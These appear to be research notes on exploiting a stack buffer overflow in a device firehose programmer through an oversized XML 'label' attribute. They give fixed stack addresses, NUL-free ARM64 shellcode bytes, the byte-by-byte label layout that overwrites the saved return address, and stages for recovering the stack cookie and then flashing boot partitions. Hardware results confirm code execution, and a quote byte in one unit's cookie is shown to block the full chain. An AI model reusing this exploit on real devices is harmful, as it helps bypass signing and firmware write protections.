# EXEC_NOTES — from `read.label` overflow to a live, unlocked session

Date: 2026-11-10
Binary: prog_firehose_ddr.elf, sha256 31ad5664023af3f9022913272e2c180fde5f658f31c9094ae9ec57c128c59086
Supersedes: §4/§6 of `CHAIN_NOTES.md` ("one-shot, flag1 dies with the session").

## 0. The premise that was wrong

`CHAIN_NOTES.md` says a clean return to the dispatcher is impossible because the
slots it needs are beyond the label terminator and "no `sub sp` / `mov sp,xN`
gadget exists". That is true — but it only matters if the stack address is
unknown. **It is not unknown. The programmer pins `sp` to a literal at entry.**

```
entry 0x149997c8  mov  sp, #0                      sp = 0
0x14999824        ldr  x0, =0x149de000
0x14999828        mov  sp, x0                      sp = 0x149de000        FIXED
0x14999c78        sub  sp, sp, #0x20               sp = 0x149ddfe0
0x149a1e78        sub  sp, sp, #0x60  (loop)       sp = 0x149ddf80  = SP_L
0x149a41a4        sub  sp, sp, #0x160 (handlers)   sp = 0x149dde20
0x149a41bc        add  x29, sp, #0x110             x29 = 0x149ddf30
                                                  dst = x29-0x50 = 0x149ddee0
```

The stack is a `.bss` array at 0x149db000, not a heap/random stack. dst is
therefore the **same address on every command of every session**. Two things
follow that the earlier notes assumed were impossible:

1. **The label is code.** It is written to a known address, and the page is
   executable at EL1 (see §1). No ROP chain, no stack pivot, no leak needed.
2. **The handler epilogue restores sp to SP_L before `ret`.**
   `0x149a42e8 add sp,sp,#0x160` runs immediately before `0x149a42ec ret`, so
   when our code starts, sp is exactly `SP_L` — the value the dispatcher loop
   expects. `b 0x149a1fc0` (or the resync entry 0x149a1f94) continues the loop
   as if the handler had returned normally.

So this is not a one-shot pivot. It is an ordinary same-session code execution
in the programmer, reached without any signature.

## 1. Why the stack is executable

Region attributes live in the table at 0x149d23c0/0x149d23e0: both
0x149db000 and 0x149de000 carry type `0x22`. `0x149c79c0` dispatches that type
to `0x149c7a3c`, which selects:

```
x27 = x24 + 0x308        x24 = 0x0040000000000004  -> UXN=1, PXN=0
if CurrentEL == 0xC: use x27                       (EL3)
else: x8 = x23 + 0x308   x23 = 0x0060000000000004  -> UXN=1, PXN=1
      if CurrentEL == 8: use x8                    (EL2)
      else keep x27                                (EL1)
```

The programmer executes at EL1 (it reads/writes `sctlr_el1` throughout its
entry stub), so neither branch is taken and the descriptor keeps **PXN=0**.
EL1 can therefore fetch from the stack. UXN only blocks EL0.

## 2. Byte constraints

Every label byte must be NUL-free: it is an XML attribute and its length comes
from `strlen()`. The saved x30 is assembled from the last 4 label bytes plus
the formatter's own NUL at dst+0x5C, then the three original zero bytes
`00 00 00` that already sit in bytes 5..7 of that slot.

That means the first 4 bytes of the label are the first instruction, so the
very first instruction must also be NUL-free:
`mov w0,#1` encodes `20 00 80 52` — it has a NUL at byte 1 and would truncate.
Use **`mov w0,#0x101`** = `20 20 80 52`: NUL-free, non-zero, and the flag1
setter's `cset w9, ne` still yields 1.

Leading `0x20 0x20` is two spaces, which also makes the label survive any
whitespace trimming. A leading `nop` (`1f 20 03 d5`) is used instead so the
payload starts on a non-space byte; both work.

## 3. The payload

Three words at dst:

```
dst+0x00  1f 20 03 d5   nop                    (padding / trim shield)
dst+0x04  20 20 80 52   mov w0, #0x101
dst+0x08  3a 33 ff 97   bl  0x149aabd0          set_flag1(1); bl sets x30 = dst+0x10
dst+0x0C  2a 10 ff 17   b   0x149a1f94          resync, then back into the loop
```

Full label (0x5C bytes):

```
dst+0x00 .. 0x47    payload + 'A' filler      (in-bounds part of the 0xD8 buffer)
dst+0x48 .. 0x4F    cookie, 8 bytes, NUL-free  (must match; checked at 0x149a42c0)
dst+0x50 .. 0x57    'J'*8                      saved x29 — dead at ret time
dst+0x58 .. 0x5B    e0 de 9d 14                low dword of dst -> saved x30
dst+0x5C            00                          formatter's NUL, byte 4 of saved x30
dst+0x5D .. 0x5F    00 00 00                    original bytes -> x30 = 0x149ddee0
```

`0x149a1f94` is the right resume point rather than the loop top: it re-opens
the RX buffer (`add x0,sp,#8 ; bl 0x149a68e8 ; mov x19,x0`) and reloads the
whole x20..x23 string table, so every invariant the loop relies on is rebuilt
before it reads the next command.

Path after `ret` into the payload:

```
set_flag1:  cmp w0,#0 ; cset w9,ne ; strb w9,[x8,#0xbc0] ; ret   -> x30 = dst+0x10
b 0x149a1f94 -> add x0,sp,#8 ; bl rx_open ; mov x19,x0 ; adrp/add x20..x23
             -> falls into 0x149a1fc0 (loop top) with sp = SP_L
```

flag1 is written before the branch, and nothing between here and the next
command clears it. The session stays live: **write permission is now real for
this session**, and `<program>`/`<erase>`/`<patch>` stop answering
`download is not allowed`.

## 4. What still gates it: the cookie

The cookie is compared against .data 0x149de358 at 0x149a42cc and any mismatch
parks the CPU in the non-returning spin loop 0x149a006c (USB stays enumerated,
session dead, needs a power cycle). The label must reproduce it verbatim, and
the cookie itself must be NUL-free or it cannot be carried.

Ships as `0xC0C0C0C0` (constant, no TZ service). TZ service 0xe is called from
0x149a1dc8; if it returns 8 bytes they are stored. `--stage probe` decides
which kind of unit this is, `--stage oracle` recovers the value bytewise.

## 5. Stages

```
python tools/exec_label.py --stage info          # geometry + payload hex, offline
python tools/exec_label.py --stage probe         # constant vs live cookie
python tools/exec_label.py --stage oracle        # bytewise recovery (resumable)
python tools/exec_label.py --stage arm-noflag    # exec + resync only (safe check)
python tools/exec_label.py --stage arm           # the real thing: flag1 := 1
python tools/exec_label.py --stage flash         # abl_a/abl_b afterwards
```

`arm-noflag` is worth one power cycle: it proves the exec and the resume on the
actual unit before trusting the setter.

## 6. Remaining honesty

* If the probe says the cookie is the shipped constant, the payload cannot run
  and the OSIG replay path is still the only way — but with a constant cookie
  the *lemma* still holds; only the NUL blocks it.
* `arm` has not been run against hardware in this round (no 9008 device on the
  bench at write time). Everything above is static plus the page-table
  analysis; the stage ladder exists to prove it in one step at a time.
* flash side is unchanged: digest entry `abl_a` wants sha256(abl.elf + zero pad
  to 68 sectors) and `abl_b` is unrestricted (all-zero sha). The tool pads with
  0x00 and checks the sector count.

---

## 7. Lab results (2026-11-10, live PLZ110)

Geometries below were all confirmed on hardware, not inferred.

### 7.1 Proven

* `read` with `label` of 0x5C bytes reaches and overwrites saved x30. A label
  whose x30 slot holds `dst` executes the label bytes at 0x149ddee0.
* The page really is executable at EL1 — a 5-word label
  (`nop; mov w0,#0x101; bl set_flag1; bl set_flag3; b 0x149a1f94`) ran and the
  dispatcher loop was rejoined; the session stayed up.
* `b 0x149a1f94` is the right resume point: it re-opens RX and reloads x19/x20..x23.
* The cookie is **stable across power cycles** on this unit
  (`22 01 01 01 01 01 01 01`), so one recovery covers every later attempt.

### 7.2 The blocker: a raw `0x22` in the cookie

The XML parser does **not** entity-decode attribute values (`&quot;` and `&#34;`
are written through literally — both tested), and it does not accept unquoted
values (`label=` + bare bytes fails at the `=`).

A raw `0x22` inside the value terminates it. So:

| label | parses | canary | reaches x30 |
|---|---|---|---|
| `A*0x48 + c0c0c0c0` (probe) | yes | shipped-const only | no |
| `A*0x48 + <cookie>` | **no** (fails at EOF) | — | — |
| `A*0x47 + 0x22` | **yes** | equal (untouched) | **no** |
| `A*0x47 + cookie + b"/>"` | **yes** | equal | **no** |

`A*0x47 + 0x22` is the clean form: the quote sits one byte *before* the cookie,
the copy writes 0x47 bytes, the formatter's NUL lands at dst+0x47, and the
cookie itself keeps its original (already-equal) contents. The session survives.
But the value ends at dst+0x47 and x30 is at dst+0x58: it is 0x11 bytes away.

Everything past the quote would have to be legal XML again, and the bytes there
(`01*7`, `J*8`, `e0 de 9d 14`) are not: `\x01` is rejected as an attribute-name
byte and `\x9d\x14` is not valid UTF-8. Attempts tried and measured, all failing
at the tail:

```
"...\x22\x01*7JJJJJJJJ\xe0\xde\x9d\x14" />      -> error at 252 (EOF)
"...\x22\x01*7/>"  + body bytes                  -> error at 240
"...\x22\x01*7= \"JJJJJ" + dst + "\" />          -> error at 222 (at the '=')
```

### 7.3 Consequence

With a cookie that contains `0x22`, one `<read>` cannot simultaneously satisfy
the cookie and reach saved x30 — the quote always closes the value first. The
overflow is then usable only as a canary-exact, non-hijacking overwrite.

Ways out, in order of cost:
1. Find a handler with a *different* frame whose cookie slot does not sit in
   front of a controllable return address — `program`/`patch` look promising but
   need flag1 first.
2. Feed the programmer a cookie without `0x22` (different programmer build, or a
   unit whose TZ service returns another value).
3. Get the OSIG sign blob (unchanged, always works).

Today's ladder is therefore: probe -> oracle (works, byte-exact) -> **arm blocked
by the quote** -> fall back to OSIG replay.

## 8. Tool status

`tools/exec_label.py` carries the quote-aware XML builder and all three stages.
`tools/oracle_loop.py` is the unattended cookie recovery (works; ~20 s per
byte-guess with a power cycle, resumes from `cookie.bin`).
`tools/t_flag3.py` is the one-off bisect harness used during the session.

### 7.4 Why the quote cannot be crossed at all

`0x22` is the value **terminator**, so it is not part of the value. `strlen()`
therefore stops in front of it and the formatter's NUL lands on the byte right
after the value. With the quote sitting at dst+0x48 that means:

```
value = A*0x48 (0x48 bytes)   NUL -> dst+0x48   canary byte0 := 0x00
```

which is why `A*0x48 + <cookie>` dies even though the bytes look right. Cutting
to `A*0x47 + 0x22` moves the NUL to dst+0x47 and leaves the whole cookie
untouched, so it passes — but the value can never continue past the quote.

So with a cookie that *starts* with `0x22`, a single `<read>` can write at most
dst+0x47 and can never reach saved x30 at dst+0x58. This is structural, not a
tuning problem.
